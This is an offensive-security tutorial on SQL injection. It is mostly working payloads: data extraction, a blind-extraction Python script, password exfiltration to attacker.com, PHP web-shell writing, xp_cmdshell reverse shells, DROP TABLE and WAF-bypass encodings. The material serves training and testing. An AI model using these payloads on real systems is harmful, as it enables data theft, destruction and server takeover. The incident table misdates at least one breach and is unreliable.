---
title: 'SQL Injection — The Complete Guide'
description: 'A comprehensive deep dive into SQL Injection: from first principles to advanced exploitation techniques, covering in-band, blind, and out-of-band attacks with real-world examples.'
icon: material/database-alert
tags:
  - sql-injection
  - web-attacks
  - owasp
  - penetration-testing
---

# SQL Injection — The Complete Guide

!!! danger "OWASP Top 10 — A03:2021 Injection"

    SQL Injection (SQLi) has been a fixture on the OWASP Top 10 since its inception. It remains one of the most critical and prevalent web application vulnerabilities in existence. A single successful SQLi attack can compromise an entire database, exfiltrate millions of records, modify or destroy data, bypass authentication, and in some cases lead to full operating system compromise.

![SQL Injection Attack Flow](../../../assets/images/knowledge-base/sql-injection/sqli-attack-flow.png)

---

## What Is SQL Injection?

**SQL Injection** occurs when an attacker is able to insert or "inject" a malicious SQL query into the input data that the application passes to its back-end database. When the application blindly trusts user-supplied input and concatenates it directly into SQL statements without proper sanitization, the attacker can manipulate the database query's logic to:

- **Bypass authentication** — log in as any user without knowing the password
- **Exfiltrate data** — read sensitive data such as credentials, credit cards, PII
- **Modify or delete data** — alter records, drop tables, or corrupt data integrity
- **Execute administrative operations** — shut down the DBMS, create new users
- **Read/write files on the OS** — using database features like `LOAD_FILE()` or `INTO OUTFILE`
- **Execute OS commands** — achieve Remote Code Execution (RCE) via `xp_cmdshell` (MSSQL), UDFs (MySQL), etc.

### The Root Cause

The fundamental problem is **mixing code (SQL) with data (user input)** in the same channel:

```sql title="Vulnerable Query — String Concatenation"
-- The application builds this query:
SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passInput + "'"
```

When a user submits `admin` and `password123`, the query becomes:

```sql title="Legitimate Query"
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
```

But when an attacker submits `' OR 1=1 --` as the username:

```sql title="Injected Query — Authentication Bypass"
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = ''
```

The `OR 1=1` condition is always true, and the `--` comments out the rest of the query. The database returns **all rows** from the `users` table, and the application logs the attacker in as the first user (often `admin`).

---

## Types of SQL Injection

SQL Injection attacks are classified based on **how the attacker retrieves data** from the database. Understanding the taxonomy is critical for choosing the right exploitation technique.

![SQL Injection Types](../../../assets/images/knowledge-base/sql-injection/sqli-types-taxonomy.png)

### 1. In-Band SQLi (Classic)

The attacker uses the **same communication channel** to both inject the payload and retrieve results. This is the most common and easiest to exploit.

#### Union-Based SQLi

Leverages the `UNION SQL` operator to combine the results of the attacker's injected query with the results of the original query, displaying exfiltrated data directly in the application's response.

```sql title="Union-Based Injection"
' UNION SELECT username, password FROM users--
```

#### Error-Based SQLi

Forces the database to generate error messages that **leak information** about the database structure and data within the error output.

```sql title="Error-Based Injection (MySQL)"
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
```

```sql title="Error-Based Injection (MSSQL)"
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
```

### 2. Blind SQLi (Inferential)

The attacker **cannot see the query output** directly in the application's response. Instead, the attacker infers information by observing the application's **behavior** — either a change in page content or a measurable time delay.

#### Boolean-Based Blind

The attacker sends a payload that causes the application to return a **different response** depending on whether the injected condition evaluates to `TRUE` or `FALSE`.

```sql title="Boolean-Based Blind"
-- Returns normal page if first character of DB version is '5':
' AND SUBSTRING(@@version, 1, 1) = '5'--

-- Returns different/empty page if the condition is false:
' AND SUBSTRING(@@version, 1, 1) = '6'--
```

#### Time-Based Blind

When the application gives **no visible difference** between true and false responses, the attacker measures the **response time**:

```sql title="Time-Based Blind (MySQL)"
-- If the first character is '5', the response is delayed by 5 seconds:
' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--
```

```sql title="Time-Based Blind (MSSQL)"
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--
```

```sql title="Time-Based Blind (PostgreSQL)"
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### 3. Out-of-Band SQLi

The attacker forces the database to make an **external network request** (DNS lookup, HTTP request) to an attacker-controlled server, carrying the exfiltrated data. This is useful when in-band and blind techniques fail.

```sql title="Out-of-Band (MySQL — DNS Exfiltration)"
' UNION SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT password FROM users LIMIT 1),
  '.attacker.com\\share'))--
```

```sql title="Out-of-Band (MSSQL — DNS Exfiltration via xp_dirtree)"
'; DECLARE @q VARCHAR(1024);
SET @q = '\\' + (SELECT TOP 1 password FROM users) + '.attacker.com\share';
EXEC master..xp_dirtree @q;--
```

---

## Identifying SQL Injection Vulnerabilities

Before exploitation, you must **detect** injectable parameters. Here is a systematic approach:

### Step 1: Find Injection Points

Test every user-controllable input:

| Input Vector | Example |
|---|---|
| URL parameters | `https://target.com/items?id=1` |
| POST body fields | `username=admin&password=test` |
| HTTP Headers | `Cookie:`, `User-Agent:`, `Referer:`, `X-Forwarded-For:` |
| JSON/XML bodies | `{"id": "1"}` |

### Step 2: Inject Test Payloads

Use these classic probes to trigger SQL errors or behavioral changes:

```text title="Basic Detection Payloads"
'
"
`
')
")
`)
'))
"))
`))
```

```text title="Logical Test Payloads"
-- These should return the SAME result as the original:
OR 1=1
OR 1=1--
OR 1=1#
OR 1=1/*

-- These should return a DIFFERENT/empty result:
OR 1=2
OR 1=2--
AND 1=2
```

```text title="Time-Based Detection"
'; WAITFOR DELAY '0:0:5'--       -- MSSQL
' AND SLEEP(5)--                 -- MySQL
' AND pg_sleep(5)--              -- PostgreSQL
1; SELECT SLEEP(5)               -- MySQL (stacked)
```

### Step 3: Determine the Database Type

Once injection is confirmed, fingerprint the DBMS:

| Payload | DBMS |
|---|---|
| `' AND @@version--` | **MySQL**, **MSSQL** |
| `' AND version()--` | **PostgreSQL**, **MySQL** |
| `' UNION SELECT banner FROM v$version--` | **Oracle** |
| `' UNION SELECT sqlite_version()--` | **SQLite** |

---

## Exploitation Deep Dive

### Union-Based Exploitation (Step-by-Step)

This is the most powerful in-band technique because it directly returns data in the HTTP response.

#### Step 1: Determine the Number of Columns

Use `ORDER BY` to find the column count:

```sql title="Column Count Enumeration"
' ORDER BY 1--    ✓ (no error)
' ORDER BY 2--    ✓ (no error)
' ORDER BY 3--    ✓ (no error)
' ORDER BY 4--    ✗ (error → only 3 columns)
```

Alternatively, use `UNION SELECT NULL`:

```sql title="NULL-Based Column Count"
' UNION SELECT NULL--              ✗
' UNION SELECT NULL, NULL--        ✗
' UNION SELECT NULL, NULL, NULL--  ✓ (3 columns confirmed)
```

#### Step 2: Find Displayed Columns

Determine which columns are rendered in the response:

```sql title="Identifying Visible Columns"
' UNION SELECT 'AAA', 'BBB', 'CCC'--
```

If `BBB` appears in the page, column 2 is the visible output channel.

#### Step 3: Extract Database Information

```sql title="MySQL — Extract Version, User, Database"
' UNION SELECT NULL, CONCAT(version(), ' | ', user(), ' | ', database()), NULL--
```

#### Step 4: Enumerate Tables

```sql title="MySQL — List All Tables"
' UNION SELECT NULL, GROUP_CONCAT(table_name SEPARATOR ', '), NULL
  FROM information_schema.tables
  WHERE table_schema = database()--
```

```sql title="MSSQL — List All Tables"
' UNION SELECT NULL, name, NULL FROM sysobjects WHERE xtype='U'--
```

```sql title="PostgreSQL — List All Tables"
' UNION SELECT NULL, tablename, NULL FROM pg_tables WHERE schemaname='public'--
```

#### Step 5: Enumerate Columns

```sql title="MySQL — List Columns of 'users' Table"
' UNION SELECT NULL, GROUP_CONCAT(column_name SEPARATOR ', '), NULL
  FROM information_schema.columns
  WHERE table_name = 'users'--
```

#### Step 6: Dump Data

```sql title="MySQL — Extract Usernames and Passwords"
' UNION SELECT NULL, GROUP_CONCAT(username, ':', password SEPARATOR '\n'), NULL
  FROM users--
```

---

### Blind Exploitation (Step-by-Step)

When no data is returned directly, you extract information **one character at a time**.

#### Boolean-Based — Extracting the Database Name

```sql title="Boolean-Based — Character Extraction"
-- Is the first character of the database name > 'm' (ASCII 109)?
' AND (SELECT ASCII(SUBSTRING(database(),1,1))) > 109--

-- Binary search continues...
-- If TRUE:  > 109 → try > 119
-- If FALSE: > 109 → try > 99
-- Eventually narrows down to the exact character
```

#### Automated Boolean Extraction Script

```python title="boolean_blind_extract.py"
#!/usr/bin/env python3
"""Boolean-based blind SQL injection data extractor."""

import requests
import string

TARGET = "http://target.com/search"
TRUE_INDICATOR = "Results found"  # String present when condition is TRUE

def inject(payload: str) -> bool:
    """Send injection payload and return True if condition was TRUE."""
    params = {"q": f"' AND {payload}-- -"}
    response = requests.get(TARGET, params=params)
    return TRUE_INDICATOR in response.text

def extract_char(query: str, position: int) -> str:
    """Extract a single character using binary search."""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        # Test: ASCII value of char at position > mid?
        if inject(f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

def extract_string(query: str, max_length: int = 64) -> str:
    """Extract a full string character by character."""
    result = ""
    for i in range(1, max_length + 1):
        char = extract_char(query, i)
        if char == " " or char == chr(32):
            # Check if we've reached the end
            if inject(f"LENGTH(({query}))<{i}"):
                break
        result += char
        print(f"\r[*] Extracting: {result}", end="", flush=True)
    print()
    return result

if __name__ == "__main__":
    print("[+] Extracting database name...")
    db_name = extract_string("SELECT database()")
    print(f"[+] Database: {db_name}")

    print("[+] Extracting current user...")
    user = extract_string("SELECT user()")
    print(f"[+] User: {user}")
```

#### Time-Based — Extracting Data

```sql title="Time-Based Extraction — MySQL"
-- Extract the first character of the database name:
' AND IF(ASCII(SUBSTRING(database(),1,1))=115, SLEEP(3), 0)--

-- If the response takes ~3 seconds, the character is 's' (ASCII 115)
```

---

### Stacked Queries

Some database drivers allow **multiple SQL statements** separated by semicolons. This enables arbitrary SQL execution:

```sql title="Stacked Queries — Create Admin User (MSSQL)"
'; INSERT INTO users (username, password, role)
   VALUES ('hacker', 'p@ssw0rd', 'admin');--
```

```sql title="Stacked Queries — Modify Data"
'; UPDATE users SET password='hacked' WHERE username='admin';--
```

```sql title="Stacked Queries — Drop Table (Destructive!)"
'; DROP TABLE users;--
```

!!! warning "Stacked Query Support Varies"

    | DBMS | Stacked Queries |
    |---|---|
    | MySQL (with `mysqli_multi_query`) | ✅ Supported |
    | MySQL (with `mysqli_query`) | ❌ Not supported |
    | MSSQL | ✅ Supported |
    | PostgreSQL | ✅ Supported |
    | Oracle | ❌ Not supported |
    | SQLite | ✅ Supported (depends on driver) |

---

## Advanced Techniques

### Reading Files from the Server

```sql title="MySQL — Read /etc/passwd"
' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL--
```

```sql title="MSSQL — Read a File via OPENROWSET"
' UNION SELECT NULL, BulkColumn, NULL FROM OPENROWSET(
  BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x--
```

### Writing Files to the Server (Web Shell)

```sql title="MySQL — Write a PHP Web Shell"
' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL
  INTO OUTFILE '/var/www/html/shell.php'--
```

!!! danger "Prerequisites for File Operations"

    - The database user must have `FILE` privileges
    - MySQL's `secure_file_priv` must allow the target directory
    - The web server's document root must be writable

### OS Command Execution

=== "MSSQL — xp_cmdshell"

    ```sql
    -- Enable xp_cmdshell (requires SA privileges):
    '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
       EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

    -- Execute a command:
    '; EXEC xp_cmdshell 'whoami';--

    -- Reverse shell:
    '; EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';--
    ```

=== "MySQL — User Defined Functions (UDF)"

    ```sql
    -- Write a shared library to the plugin directory:
    ' UNION SELECT NULL, <binary_udf_hex>, NULL
      INTO DUMPFILE '/usr/lib/mysql/plugin/udf_exec.so'--

    -- Create the function:
    '; CREATE FUNCTION sys_exec RETURNS INTEGER
       SONAME 'udf_exec.so';--

    -- Execute commands:
    '; SELECT sys_exec('id');--
    ```

=== "PostgreSQL — COPY TO program"

    ```sql
    '; CREATE TABLE cmd_output(line TEXT);
       COPY cmd_output FROM PROGRAM 'id';
       SELECT * FROM cmd_output;--
    ```

---

## WAF Bypass Techniques

When a Web Application Firewall (WAF) blocks standard payloads, use these evasion techniques:

### Case Manipulation

```sql
' uNiOn SeLeCt NULL, username, password FROM users--
```

### Comments as Whitespace

```sql
'/**/UNION/**/SELECT/**/NULL,username,password/**/FROM/**/users--
```

### URL Encoding

```
%27%20UNION%20SELECT%20NULL%2Cusername%2Cpassword%20FROM%20users--
```

### Double URL Encoding

```
%2527%2520UNION%2520SELECT%2520NULL%252Cusername%252Cpassword%2520FROM%2520users--
```

### Hex Encoding Strings

```sql
' UNION SELECT NULL, username, password FROM users WHERE username=0x61646d696e--
-- 0x61646d696e = 'admin' in hex
```

### No-Space Payloads

```sql
'UNION(SELECT(NULL),(username),(password)FROM(users))--
```

### String Concatenation

```sql
-- MySQL:
CONCAT('adm','in')

-- MSSQL:
'adm'+'in'

-- Oracle / PostgreSQL:
'adm'||'in'
```

---

## Database-Specific Cheatsheet

=== "MySQL"

    | Task | Payload |
    |---|---|
    | Version | `SELECT @@version` |
    | Current User | `SELECT user()` |
    | Current Database | `SELECT database()` |
    | List Databases | `SELECT schema_name FROM information_schema.schemata` |
    | List Tables | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` |
    | List Columns | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` |
    | String Concatenation | `CONCAT(str1, str2)` or `str1 || str2` (MySQL 8+) |
    | Substring | `SUBSTRING(str, pos, len)` |
    | Comments | `-- `, `#`, `/* */` |
    | Time Delay | `SLEEP(5)` |
    | If Statement | `IF(condition, true_val, false_val)` |
    | DNS Exfiltration | `LOAD_FILE(CONCAT('\\\\',data,'.attacker.com\\a'))` |

=== "MSSQL"

    | Task | Payload |
    |---|---|
    | Version | `SELECT @@version` |
    | Current User | `SELECT user_name()` or `SELECT SYSTEM_USER` |
    | Current Database | `SELECT DB_NAME()` |
    | List Databases | `SELECT name FROM master.dbo.sysdatabases` |
    | List Tables | `SELECT name FROM sysobjects WHERE xtype='U'` |
    | List Columns | `SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')` |
    | String Concatenation | `'str1' + 'str2'` |
    | Substring | `SUBSTRING(str, pos, len)` |
    | Comments | `-- `, `/* */` |
    | Time Delay | `WAITFOR DELAY '0:0:5'` |
    | Stacked Queries | ✅ Supported |
    | Command Execution | `EXEC xp_cmdshell 'command'` |

=== "PostgreSQL"

    | Task | Payload |
    |---|---|
    | Version | `SELECT version()` |
    | Current User | `SELECT current_user` |
    | Current Database | `SELECT current_database()` |
    | List Databases | `SELECT datname FROM pg_database` |
    | List Tables | `SELECT tablename FROM pg_tables WHERE schemaname='public'` |
    | List Columns | `SELECT column_name FROM information_schema.columns WHERE table_name='users'` |
    | String Concatenation | `'str1' \|\| 'str2'` |
    | Substring | `SUBSTRING(str FROM pos FOR len)` |
    | Comments | `-- `, `/* */` |
    | Time Delay | `pg_sleep(5)` |
    | Command Execution | `COPY ... FROM PROGRAM 'command'` |

=== "Oracle"

    | Task | Payload |
    |---|---|
    | Version | `SELECT banner FROM v$version WHERE ROWNUM=1` |
    | Current User | `SELECT user FROM dual` |
    | Current Database | `SELECT global_name FROM global_name` |
    | List Tables | `SELECT table_name FROM all_tables` |
    | List Columns | `SELECT column_name FROM all_tab_columns WHERE table_name='USERS'` |
    | String Concatenation | `'str1' \|\| 'str2'` |
    | Substring | `SUBSTR(str, pos, len)` |
    | Comments | `-- `, `/* */` |
    | Time Delay | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` |
    | Conditional | `CASE WHEN (condition) THEN 'a' ELSE 'b' END` |

---

## Second-Order SQL Injection

In **second-order SQLi**, the malicious payload is stored in the database and executed later in a **different context** — typically a different query or feature.

### Example Scenario

1. An attacker registers with username: `admin'--`
2. The registration query safely uses parameterized queries → **no injection occurs**
3. Later, a "change password" feature uses the stored username unsafely:

```sql title="Second-Order Injection — Password Change"
-- The application retrieves the stored username and uses it:
UPDATE users SET password = 'newpass' WHERE username = 'admin'--'
-- The injected '--' comments out the closing quote
-- Result: the admin's password is changed!
```

!!! tip "Detection is Difficult"

    Second-order SQLi is hard to detect with automated scanners because the injection point and the execution point are in different application flows. Manual code review and thorough testing are essential.

---

## Real-World Impact

| Year | Incident | Records Exposed | Attack Vector |
|---|---|---|---|
| 2008 | **Heartland Payment Systems** | 134 million credit cards | SQL Injection |
| 2011 | **Sony PlayStation Network** | 77 million accounts | SQL Injection |
| 2012 | **LinkedIn** | 6.5 million password hashes | SQL Injection |
| 2014 | **TalkTalk** | 157,000 customer records | SQL Injection |
| 2015 | **VTech** | 6.4 million children's profiles | SQL Injection |
| 2019 | **Fortnite** | 200 million accounts (potential) | SQL Injection |

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [HackTricks — SQL Injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PentestMonkey — SQL Injection Cheatsheets](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
